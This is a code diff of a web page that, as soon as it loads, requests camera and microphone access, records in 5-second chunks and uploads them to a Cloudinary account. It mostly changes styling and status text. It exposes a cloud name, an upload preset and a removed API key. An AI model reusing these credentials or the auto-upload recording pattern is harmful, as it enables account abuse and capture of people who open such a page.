@@ -37,22 +37,22 @@
         }
         video {
             width: 100%;
-            max-height: 320px;
+            max-height: 280px;
             border-radius: 12px;
             background: #000;
             object-fit: cover;
             border: 2px solid rgba(255, 255, 255, 0.2);
-            transform: scaleX(-1); /* Mirror view ke liye */
+            transform: scaleX(-1);
         }
         #status {
-            margin-top: 20px;
-            font-size: 15px;
-            min-height: 24px;
+            margin-top: 15px;
+            font-size: 14px;
             color: #f1c40f;
+            word-break: break-all;
         }
         #linksContainer {
             margin-top: 15px;
-            max-height: 120px;
+            max-height: 100px;
             overflow-y: auto;
             text-align: left;
             font-size: 13px;
@@ -90,11 +90,9 @@
         const linksContainer = document.getElementById('linksContainer');
 
         const CLOUD_NAME = "zowk74pz";
-        const API_KEY = "684481677341335";
         const UPLOAD_PRESET = "GrpVTqmhonJpsAJFm_YcY2wVnwM";
         const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`;
 
-        // 1. Page load hote hi Camera aur Mic ki permission lena aur automatic recording start karna
         async function initMedia() {
             try {
                 status.innerText = "Kripya Camera aur Microphone ki permission dein...";
@@ -102,11 +100,10 @@
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 preview.srcObject = stream;
                 
-                status.innerText = "🔴 Permission mil gayi! Auto-recording shuru ho chuki hai...";
+                status.innerText = "🔴 Recording chalu hai... Har 5 second mein upload ho raha hai.";
 
                 mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
-                // 2. Har 5 second baad yeh event trigger hoga aur chunk dega
                 mediaRecorder.ondataavailable = async (event) => {
                     if (event.data && event.data.size > 0) {
                         const chunkBlob = new Blob([event.data], { type: 'video/webm' });
@@ -114,16 +111,14 @@
                     }
                 };
 
-                // 3. Permission milte hi automatic 5-second interval par recording start kar dena
                 mediaRecorder.start(5000);
 
             } catch (err) {
                 console.error("Permission error:", err);
-                status.innerText = "Error: Camera ya Microphone ki permission nahi mili.";
+                status.innerText = "Error: Camera ya Mic ki permission nahi mili.";
             }
         }
 
-        // 4. Cloudinary par file upload karne ka function
         async function uploadToCloudinary(blob) {
             const formData = new FormData();
             formData.append("file", blob);
@@ -141,17 +136,18 @@
                     const link = document.createElement('a');
                     link.href = data.secure_url;
                     link.target = "_blank";
-                    link.innerText = `[${timeStr}] 5-Sec Video Saved (Click to view)`;
-                    linksContainer.prepend(link); // Naye links upar show honge
+                    link.innerText = `[${timeStr}] Saved! Click to view`;
+                    linksContainer.prepend(link);
                 } else {
-                    console.error("Cloudinary Error:", data.error?.message);
+                    console.error("Cloudinary Error:", data);
+                    status.innerText = "Upload Failed: " + (data.error?.message || "Invalid Preset/Cloud Name");
                 }
             } catch (err) {
-                console.error("Network/Upload error:", err);
+                console.error("Network error:", err);
+                status.innerText = "Network Error: Upload nahi ho saka.";
             }
         }
 
-        // App start hote hi function run hoga
         window.addEventListener('load', initMedia);
     </script>
 </body>
